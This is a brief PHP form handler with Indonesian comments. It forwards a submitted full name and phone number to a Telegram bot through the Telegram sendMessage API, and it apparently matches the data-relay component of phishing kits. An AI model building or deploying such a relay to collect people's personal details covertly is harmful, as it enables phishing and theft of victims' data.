<?php
include "telegram.php";
session_start();

// Data yang diterima dari form
$full_name = $_POST['full_name'];
$phone_number = $_POST['phone_number'];

// Pesan yang akan dikirim ke bot Telegram
$message = "
(------------> )
Full name : ".$full_name."
Nomor : ".$phone_number."
";

// URL endpoint untuk mengirim pesan ke bot Telegram
$telegramAPIURL = "https://api.telegram.org/bot$telegramBotToken/sendMessage";

// Menggunakan cURL untuk membuat permintaan POST ke API Telegram
$ch = curl_init($telegramAPIURL);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, [
    'chat_id' => $telegramChatID,
    'text' => $message,
]);
curl_exec($ch);
curl_close($ch);

// Proses selanjutnya sesuai kebutuhan Anda

?>
